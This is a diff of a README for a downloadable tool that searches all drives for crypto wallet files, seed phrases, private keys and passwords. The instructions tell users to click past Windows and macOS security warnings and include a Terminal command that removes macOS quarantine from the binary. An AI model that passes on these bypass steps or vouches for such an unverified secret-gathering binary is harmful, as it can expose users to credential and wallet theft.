@@ -1,183 +1,110 @@
-# 🐶 Muffin's Treasure Hunting Tool 🐾
+# Muffin's Treasure Hunting Tool 🐾✨
 
-Welcome to **Muffin's Treasure Hunting Tool**! Muffin is here to help you sniff out crypto treasures hidden on your computer. Let's embark on a fun-filled adventure to discover wallets, keys, and secret phrases you might have forgotten about!
-
----
-
-## 🎉 Quick Start Guide
-
-**Ready to start hunting with Muffin?** Here's how you can download and run the tool:
-
-### 🔽 Download the Tool
-
-- **Windows Users:**
-  - [Download MuffinsTreasureHunt.exe](https://example.com/MuffinsTreasureHunt.exe)
-- **macOS Users:**
-  - [Download MuffinsTreasureHunt.dmg](https://example.com/MuffinsTreasureHunt.dmg)
-
-### 🚀 Running the Tool
-
-**Windows:**
-
-1. **Locate the Downloaded File:**
-   - Find the `MuffinsTreasureHunt.exe` file in your `Downloads` folder or the location you saved it to.
-
-2. **Run the Application:**
-   - Double-click the `MuffinsTreasureHunt.exe` file to launch Muffin's Treasure Hunting Tool.
-
-3. **Follow Muffin's Prompts:**
-   - Muffin will guide you through the treasure hunt with easy-to-follow instructions.
-
-**macOS:**
-
-1. **Open the Downloaded File:**
-   - Double-click the `MuffinsTreasureHunt.dmg` file to open it.
-
-2. **Install the Application:**
-   - Drag and drop `MuffinsTreasureHunt.app` into your `Applications` folder.
-
-3. **Launch the Tool:**
-   - Navigate to your `Applications` folder and double-click `MuffinsTreasureHunt.app` to start the adventure.
-
-4. **Bypass Security Prompt (if needed):**
-   - If you see a security message, go to `System Preferences` > `Security & Privacy` > `General`, and click `Open Anyway` next to `MuffinsTreasureHunt.app`.
-
-5. **Embark on the Hunt:**
-   - Muffin will greet you and provide step-by-step prompts to begin searching for treasures.
+**Muffin is here to sniff out your crypto treasures!**  
 
 ---
+## 🐶 What Does This Tool Do?
 
-## 🐾 What Does Muffin's Treasure Hunting Tool Do?
+Muffin's Treasure Hunting Tool scans your computer for crypto-related files, such as wallet backups, recovery phrases, or sensitive keys. It searches through all storage drives (internal and external) for keywords related to cryptocurrency wallets, private keys, and other important crypto-related information.
 
-Muffin is a clever pup who can:
+The results are saved in:
 
-- **🔍 Search your drives** for crypto wallets, keys, and hidden treasures.
-- **📄 Scan files** for sensitive data, including text, spreadsheets, and more.
-- **📊 Export results** to a text file and a spreadsheet for easy review.
-- **⚙️ Customize scanning** to fit your needs with adjustable settings.
-
----
-
-## 🌟 Features
-
-- **Customizable Scanning:** Specify which drives or directories to scan.
-- **Multithreaded Performance:** Muffin works efficiently to sniff out treasures.
-- **Advanced Detection:** Improved algorithms to find crypto-related files.
-- **User-Friendly Interface:** Easy-to-follow prompts guide you through the process.
-- **Detailed Logging:** Choose your preferred level of detail in logs.
+1. **A text file** for easy viewing, which includes all console logs and messages.
+2. **A spreadsheet** with advanced filtering, sorting, and clickable paths.
+3. **An error log** to capture any processing issues for review.
 
 ---
+## 🚀 Features:
 
-## 📝 How to Use Muffin's Treasure Hunting Tool
-
-1. **Launch the Tool:**
-   - Open the application following the steps in the Quick Start Guide.
-
-2. **Select Drives or Paths to Scan:**
-   - Muffin will ask you which drives or directories you'd like to scan.
-   - Type `ALL` to scan all available drives, or specify particular drives (e.g., `C D`).
-
-3. **Adjust Settings (Optional):**
-   - Modify scanning preferences to tailor the search to your needs.
-
-4. **Start the Hunt:**
-   - Sit back and watch as Muffin sniffs out hidden crypto treasures!
-   - A progress bar will show you how far along Muffin is in the search.
-
-5. **Review Results:**
-   - Once the scan is complete, check the exported text file and spreadsheet located on your desktop in the `Muffins_Treasure_Hunt_Results` folder.
-
-6. **Celebrate Your Findings:**
-   - Who knows what treasures Muffin has unearthed? Maybe that long-lost wallet!
+- **Search for Crypto Wallets and Keys:** Includes keywords like "crypto," "wallet," "bitcoin," "ethereum," "password," and more. Supports popular and legacy wallet names like MetaMask, Phantom, and Electrum.
+- **Scans File Contents:** Searches the contents of `.txt`, `.docx`, `.pdf`, `.csv`, `.xlsx`, and `.json` files for relevant keywords.
+- **Handles Image Files Intelligently:** Scans `.png`, `.jpg`, `.jpeg`, and `.gif` files **only if their filenames** match relevant keywords, to detect potential screenshots of private keys or seed phrases.
+- **Dynamic Drive Scanning:** Automatically detects and scans all available drives, including external flash drives.
+- **Smart Filtering for Program Assets:** Excludes common paths and folders containing program assets, such as `images`, `icons`, and `AppData`.
+- **Friendly Console Display:** Real-time progress updates, emojis, and drive selection prompts.
+- **Error Logging:** Captures any file-reading or processing errors in a dedicated log file.
+- **Easy-to-Read Results:** Outputs results to both a detailed text file and a filterable spreadsheet with clickable paths.
+- **Cross-Platform:** Compatible with Windows and macOS.
 
 ---
+## 🛠️ How to Use It  
 
-## ⚙️ Advanced Configuration
+### Step 1: Download the Tool  
 
-Want to customize Muffin's sniffing powers even further? Here's how:
-
-1. **Locate the `config.json` File:**
-
-   - The `config.json` file is located in the same directory as the application.
-
-2. **Modify Settings:**
-
-   - Open `config.json` with a text editor like Notepad (Windows) or TextEdit (macOS).
-
-   - Adjust the following settings as desired:
-
-     ```json
-     {
-       "include_paths": ["C:\\Users\\YourUser\\Documents"],
-       "exclude_paths": ["C:\\Users\\YourUser\\Documents\\ExcludeFolder"],
-       "include_extensions": [".txt", ".docx", ".pdf", ".json"],
-       "exclude_extensions": [".mp3", ".mp4", ".exe"],
-       "log_level": "INFO",
-       "max_threads": 4
-     }
-     ```
-
-   - **`include_paths`:** Directories you specifically want to include.
-   - **`exclude_paths`:** Directories you want Muffin to skip.
-   - **`include_extensions`:** File types to focus on.
-   - **`exclude_extensions`:** File types to ignore.
-   - **`log_level`:** Set to `"DEBUG"` for more detailed logs or `"INFO"` for general information.
-   - **`max_threads`:** Number of threads Muffin uses to speed up the search.
-
-3. **Save Changes and Relaunch:**
-
-   - After saving your changes to `config.json`, relaunch the tool for the new settings to take effect.
+1. Visit the GitHub repository hosting Muffin's Treasure Hunting Tool.  
+2. Download the correct file for your operating system:  
+   - **Windows:** `Muffins_Treasure_Hunt_Windows.zip`  
+   - **Mac:** `Muffins_Treasure_Hunt_Mac.zip`  
 
 ---
+### Step 2: Extract the Files  
 
-## 🔐 Privacy and Security
+- **Windows:**  
+   1. Right-click the `.zip` file and select "Extract All."  
+   2. Open the extracted folder.  
 
-Your privacy is important! Muffin's Treasure Hunting Tool:
-
-- **Processes data locally** on your computer. No data is transmitted externally.
-- **Handles sensitive information carefully,** ensuring your secrets stay secret.
-- **Provides detailed logs** so you can review what Muffin has sniffed.
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q:** *Is Muffin's Treasure Hunting Tool safe to use?*
-
-**A:** Absolutely! Muffin respects your privacy and only processes data locally. Your information remains on your computer.
-
-**Q:** *Can I customize which files Muffin scans?*
-
-**A:** Yes! Use the `config.json` file to specify exactly what you want Muffin to include or exclude.
-
-**Q:** *What if I need help or have suggestions?*
-
-**A:** We'd love to hear from you! Feel free to reach out with any questions or feedback.
+- **Mac:**  
+   1. Double-click the `.zip` file to extract it.  
+   2. Open the extracted folder.  
 
 ---
+### Step 3: Run the Tool  
 
-## 🐕 About Muffin
+- **Windows:**  
+   1. Double-click the file named `Muffins_Treasure_Hunt_Windows.exe`.  
+   2. If Windows blocks the program, click **More Info > Run Anyway**.  
 
-Muffin is your trusty companion on this treasure-hunting journey. With a keen nose for crypto treasures and a heart full of adventure, Muffin is dedicated to helping you rediscover forgotten crypto assets. Let Muffin guide you through the exciting world of treasure hunting!
-
----
-
-## 🎯 Tips for Successful Treasure Hunting
-
-- **Be Patient:** The hunt might take some time, especially on large drives.
-- **Stay Informed:** Keep an eye on Muffin's progress through the on-screen updates.
-- **Review the Results Carefully:** Take your time to go through the findings.
-
----
-
-## 📢 Disclaimer
-
-Muffin's Treasure Hunting Tool is designed to assist you in locating crypto-related files on your computer. It is not guaranteed to find all such files, nor can it ensure the recovery of lost assets. Use the tool responsibly and verify any findings independently.
+- **Mac:**  
+   1. Double-click the file named `Muffins_Treasure_Hunt_Mac`.  
+   2. If macOS blocks the program:  
+      - Go to **System Preferences > Security & Privacy > Open Anyway**.  
+      - Alternatively, run the following command in Terminal:  
+        ```bash
+        xattr -d com.apple.quarantine /path/to/Muffins_Treasure_Hunt_Mac
+        ```
 
 ---
+### Step 4: Select Drives and Watch the Magic  
 
-**Happy hunting, and may you uncover the treasures that await!** 🐶💎
+1. **Welcome Screen:** The program will display an intro screen with information about its functionality.  
+2. **Drive Selection:** You'll be prompted to select the drives you want Muffin to scan by entering the corresponding numbers.  
+3. **Real-Time Logging:** As Muffin sniffs through your files, you'll see updates in the console with fun icons and file names.  
 
 ---
+### Step 5: View the Results  
 
-*Remember: Muffin is always here to help sniff out your crypto treasures!*
+After the hunt is complete, three files will be saved in a new folder on your Desktop named **Muffins_Treasure_Hunt_Results**:
+
+1. **`Muffins_Treasure_Hunt_Path_Log.txt`:**  
+   - Captures all console logs, including welcome messages, progress updates, errors, and final results.  
+
+2. **`Muffins_Treasure_Hunt_Results.xlsx`:**  
+   - A detailed spreadsheet with:  
+     - **Drive**: The drive where the file was found.  
+     - **Top Folder**: The highest folder after the drive.  
+     - **Bottom Folder**: The immediate folder containing the file.  
+     - **Keyword Match**: The matched keyword(s) triggering the result.  
+     - **File Extension**: The file extension (e.g., `.pdf`, `.txt`).  
+     - **File Name**: The name of the file.  
+     - **File Path**: A clickable link to the file's folder (not the file itself).  
+
+3. **`Muffins_Treasure_Hunt_Errors.txt`:**  
+   - Logs any errors encountered during processing, such as unreadable files or unsupported formats.  
+
+---
+## 📝 Notes:
+
+- **Safety:** This tool does not modify or delete files; it only searches and records.  
+- **Performance:** Depending on the size of your drives, the scan may take some time.  
+- **Privacy:** Results stay on your computer—nothing is sent online.  
+
+---
+## 🐾 Muffin’s Mission:
+
+Muffin’s Treasure Hunting Tool is designed to uncover forgotten or lost crypto-related files from your computer. It’s perfect for anyone looking to rediscover hidden treasures from old wallets, backups, and recovery files.  
+
+Let Muffin help you uncover hidden crypto treasures! 🐶💎  
+
+For any questions, reach out via the GitHub repository's **Issues** section.  
+
+🐾✨
